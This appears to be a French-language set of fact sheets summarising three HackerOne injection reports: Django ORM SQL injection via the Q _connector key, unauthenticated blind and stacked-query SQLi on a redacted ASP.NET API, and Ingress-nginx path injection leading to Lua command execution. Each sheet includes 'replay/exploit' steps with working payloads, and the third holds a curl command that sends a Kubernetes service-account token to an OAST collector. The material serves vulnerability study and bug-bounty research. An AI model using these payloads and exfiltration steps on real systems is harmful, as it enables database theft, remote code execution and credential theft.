# Fiches SSS — Injection (SQLi / XXE / Code / Argument)

*3 cas sélectionnés dans le corpus 2025-2026 (HackerOne).*

### SQL Injection in Django ORM via Unvalidated `_connector` in Q Objects

**📄 Cas réel**
sévérité : critical · [source](https://hackerone.com/reports/3335709)

`WhereNode.as_sql` (`django/db/models/sql/where.py`) insère le connecteur du nœud dans la requête par formatage de chaîne, sans validation. Le framework permet de fixer ce connecteur via l'argument `_connector` d'un `Q` : une application qui dépaquette un dictionnaire de filtres contrôlé (`Q(**filter_dictionary)`) laisse injecter du SQL brut dans la clause `WHERE`, hors paramétrisation de l'ORM. Le PoC local montre que le payload `) OR 1=1 OR (` fait retourner l'utilisateur `root` (admin) malgré les filtres. Impact : contournement de filtre, exfiltration de toutes les données du modèle interrogé, déni de service possible.

**Cause racine :** `self.connector` est inséré par `' %s ' % …` sans allow-list ; le pattern `Q(**user_dict)` permet d'injecter la clé interne `_connector`.

**Preuve technique (verbatim depuis la source) :**

```python
conn = ' %s ' % self.connector
```
```python
filter_dictionary = request.json.get('filters', {{}})
query = Q(**filter_dictionary) # VULNERABLE LINE
results = User.objects.filter(query)
```
```text
"_connector": ") OR 1=1 OR ("
SELECT "webapp_user"."id", "webapp_user"."username", "webapp_user"."is_admin" FROM "webapp_user" WHERE (NOT "webapp_user"."is_admin" ) OR 1=1 OR ( "webapp_user"."username" = 'nonexistent_user')
```

**Rejouer / exploiter (dérivé de la source) :**
- Prérequis : le pattern vulnérable `Q(**user_input)` dans une application Django (la source cite une API de recherche) ; le PoC local n'exige qu'une installation Django. Version affectée : non documenté dans la source.
- Étapes : 1. `django-admin startproject sqli .`, `python manage.py startapp webapp`, ajouter `'webapp'` à `INSTALLED_APPS`. 2. Créer le modèle `User` (username, is_admin) et `webapp/management/commands/poc.py` (fonction vulnérable `Q(**search_dict)` + dictionnaire `{"is_admin": False, "_connector": ") OR 1=1 OR ("}`). 3. `makemigrations`, `migrate`, puis `python manage.py poc`. 4. Lire le SQL généré (le connecteur injecté apparaît tel quel) et constater que `root` (admin) est retourné.
- Pièges / limites : l'exemple est un PoC local simulant `request.json.get('filters')`, pas un endpoint cible réel ; l'exploit réel n'existe que si l'application dépaquette des clés contrôlées par l'utilisateur ; l'impact dépend des données du modèle interrogé.

**Reproductibilité :** moyenne — toutes les étapes du PoC local sont fournies, mais l'exploitation réelle dépend d'un pattern applicatif précis (`Q(**user_dict)`).

**Techniques :** orm dict-unpacking abuse, connector injection, sql injection via string formatting, filter bypass (or 1=1), data exfiltration

**Correspond aux classes qualifiantes :** sqli, info disclosure (filtres contournés)

**Signal (endpoints/fonctions observés) :**
- `WhereNode.as_sql` (`django/db/models/sql/where.py`)
- `conn = ' %s ' % self.connector`
- `Q(**filter_dictionary)` puis `User.objects.filter(query)`
- clé interne `_connector` acceptée depuis les kwargs utilisateur

**Paramètres impliqués :** `filters` (dictionnaire de filtres ; clé interne `_connector`)

### Critical SQL Injection WDM API (████████)

**📄 Cas réel**
sévérité : critical · [source](https://hackerone.com/reports/3778282)

SQLi aveugle booléenne et temporelle **non authentifiée** dans `searchText` de `GET /api/WDMProduct`, backend ASP.NET/IIS (Azure App Service) du SPA Angular « EcoMed Safety Hub », découvert via `window.baseApiUrl` laissé dans un `<script>` inline et un Swagger exposé (`/swagger/v2/swagger.json`). Le booléen contrôle tout le jeu de résultats (22 911 octets / 179 lignes pour `1=1` contre 29 octets / 0 ligne pour `1=2`), `sys.tables` confirme MSSQL et `;WAITFOR DELAY '0:0:6'--` prouve les requêtes empilées (6,43 s). Extraction blind en 1052 requêtes / 21,4 s : user `webwm`, « Microsoft SQL Azure (RTM) - 12.0.2000.8 », 10 tables dont `vw_WDM_searchData`. CORS `Access-Control-Allow-Origin: *` → requêtable depuis n'importe quelle page web.

**Cause racine :** `searchText` concaténé dans une clause `LIKE` sans requête paramétrée ; la source infère `WHERE (productDescription LIKE '%' + @searchText + '%')`.

**Preuve technique (verbatim depuis la source) :**

```http
GET /api/WDMProduct?searchText=zzz%27)%20OR%201%3D1--
(Decoded: `searchText=zzz') OR 1=1--`)
```
```text
Response: HTTP 200, **22,911 bytes, 179 product rows**
```
```http
GET /api/WDMProduct?searchText=zzz%27);WAITFOR%20DELAY%20%270:0:6%27--
(Decoded: `searchText=zzz');WAITFOR DELAY '0:0:6'--`)
```
```text
Response: HTTP 200, 29 bytes, **6.43 seconds elapsed** vs ~0.2 s for all other requests. Stacked queries are enabled.
```

**Rejouer / exploiter (dérivé de la source) :**
- Prérequis : aucun compte (« Auth required: NONE ») ; l'hôte réel et plusieurs identifiants sont caviardés (████████) ; envoyer le User-Agent indiqué par la source (Chrome 136 / macOS).
- Étapes : 1. repérer le backend via `window.baseApiUrl = '████████api';` et le Swagger `/swagger/v2/swagger.json`. 2. Baseline `searchText=test` → HTTP 200, 29 octets, zéro ligne. 3. `searchText=zzz') OR 1=1--` → 179 lignes. 4. Contrôle `1=2` → 0 ligne. 5. Fingerprint MSSQL : `... OR (SELECT COUNT(*) FROM sys.tables)>0--`. 6. Empiler `zzz');WAITFOR DELAY '0:0:6'--` et chronométrer (~6,43 s). 7. Extraction blind par recherche binaire ASCII (`extract.py`).
- Pièges / limites : hôte et noms caviardés ; l'extraction blind a été interrompue par un timeout réseau après 10+ requêtes/caractère ; l'escalade RCE via `xp_cmdshell` dépend des privilèges du principal SQL et n'est pas prouvée.

**Reproductibilité :** moyenne — méthode et payloads complets et sans authentification, mais l'hôte cible est caviardé dans la source.

**Techniques :** blind sqli (boolean-based, time-based), stacked queries, mssql fingerprinting, ascii binary-search extraction, cors wildcard, swagger exposure, inline-script config leak

**Correspond aux classes qualifiantes :** sqli, rce (potentiel via xp_cmdshell), info disclosure (swagger), cors misconfiguration

**Signal (endpoints/fonctions observés) :**
- `GET /api/WDMProduct?searchText=`
- `window.baseApiUrl = '████████api';` (dans un `<script>` inline)
- `/swagger/v2/swagger.json` (titre `WDM Api 2`, 3 paths GET)
- en-tête `Access-Control-Allow-Origin: *`, `WAITFOR DELAY`, `sys.tables`

**Paramètres impliqués :** `searchText`

### Injection in path parameter of Ingress-nginx

**📄 Cas réel**
sévérité : high · [source](https://hackerone.com/reports/2701701)

Un attaquant d'un cluster multi-tenant autorisé à créer/modifier des Ingress injecte des directives nginx arbitraires via le champ `path`, permissif. Les restrictions de l'inspector d'ingress issues de la mitigation de CVE-2021-25748 empêchant un `by_lua` trivial, l'exploit se fait en deux étapes : (1) un Ingress injectant `client_body_in_file_only` écrit le corps d'un POST dans `/tmp/nginx/f292392` ; (2) un second Ingress `include /tmp/nginx/f292392/*;` charge le fichier déposé, qui contient un `set_by_lua_block` exécutant `io.popen()` sur l'en-tête `pathinjection` et renvoyant la sortie dans `X-My-Var`. Le PoC exfiltre le token du service account (`/var/run/secrets/kubernetes.io/serviceaccount/token`) par `curl -F` vers un domaine OAST. Impact : lecture de fichiers arbitraires sur le contrôleur ingress (dont le service account).

**Cause racine :** la valeur de `path` est recopiée verbatim dans la configuration nginx de l'ingress controller — injection de directives au lieu d'un simple préfixe d'URL.

**Preuve technique (verbatim depuis la source) :**

```yaml
        path: |-
          /f292392body/ {
          limit_except POST              { deny all; }
          client_body_temp_path          /tmp/nginx/f292392;
          client_body_in_file_only       on;
```
```text
set_by_lua_block $my_var { 
            local rsfile = io.popen(ngx.req.get_headers()["pathinjection"]);
            local rschar = rsfile:read("*all");ngx.say(rschar); 
            return rschar;
} 
```
```bash
curl http://f292392.com/rcewithhost/ --resolve f292392.com:80:4.178.145.81 -k -H "pathinjection: curl -F 'file=@/var/run/secrets/kubernetes.io/serviceaccount/token' http://hdyy6lwp6kifbu1cv7euclvuyl4cs3gs.oastify.com.oastify.com"
```

**Rejouer / exploiter (dérivé de la source) :**
- Prérequis : cluster multi-tenant, droit de créer/modifier des Ingress (PoC en namespace `default`), un service cible (`legitimate-service`), un domaine contrôlé (`f292392.com`), l'IP du contrôleur ingress et un collecteur OAST.
- Étapes : 1. créer l'Ingress `f292392-research` avec le `path` injecté (`/f292392body/ { … client_body_in_file_only on; }`). 2. Déposer la config lua : `curl http://f292392.com/f292392body/ --resolve f292392.com:80:<IP> -k -vv --data-binary '@./exploit.txt'`. 3. Créer le second Ingress avec `/rcewithhost/` et `include /tmp/nginx/f292392/*;`. 4. Envoyer la requête avec l'en-tête `pathinjection` contenant `curl -F 'file=@/var/run/.../token' http://<oast>`. 5. Récupérer le token du service account dans la requête reçue sur l'OAST.
- Pièges / limites : nom de fichier déposé imprévisible, d'où l'`include` avec wildcard ; il faut être le seul à avoir requêté l'Ingress pour éviter les collisions ; l'IP `4.178.145.81` du PoC est celle du contrôleur de l'auteur ; version du contrôleur non documentée dans la source.

**Reproductibilité :** moyenne — chaîne complète (YAML, config lua, curl) mais exige un cluster multi-tenant et des droits de création d'Ingress.

**Techniques :** kubernetes ingress path injection, nginx directive injection, arbitrary file write (client_body_in_file_only), lua code execution via include, oast exfiltration, service account token theft, cve-2021-25748 mitigation bypass

**Correspond aux classes qualifiantes :** rce (code injection), info disclosure (token de service account), privilege escalation k8s

**Signal (endpoints/fonctions observés) :**
- `spec.rules[].http.paths[].path` (Ingress)
- `client_body_temp_path`, `client_body_in_file_only`, `include /tmp/nginx/.../*`
- `set_by_lua_block`, `io.popen`, en-tête `pathinjection`, réponse `X-My-Var`
- `/var/run/secrets/kubernetes.io/serviceaccount/token`

**Paramètres impliqués :** `path`, en-tête `pathinjection`, annotation `kubernetes.io/ingress.class`
